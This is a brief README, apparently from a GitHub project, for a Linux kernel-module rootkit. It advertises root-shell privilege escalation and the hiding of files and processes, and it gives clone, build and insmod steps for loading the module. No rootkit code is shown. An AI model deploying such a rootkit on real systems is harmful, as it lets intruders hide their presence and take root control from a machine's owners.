## Overview
Satanic rootkit is implemented as a Linux kernel module targeting 4.9.0 or later kernels (for both x86 and x86_64 platforms).

<br>

## Features
* Local privilege escalation (grant root shell)
* Hide any directory or file by ABSOLUTE PATH.
* Hide any process by PID
* ...

<br>

## Build Requirements / Installation
#### Build Requirements
* gcc
* Linux headers

#### Installation
1. Build kernel module
```
$ git clone https://github.com/aesophor/satanic-rootkit.git
$ cd satanic-rootkit
$ make
```

2. Insert kernel module
```
$ sudo insmod satan.ko
```
<br>

## License
Available under [GPL-2.0 License](https://github.com/aesophor/satanic-rootkit/blob/master/LICENSE)
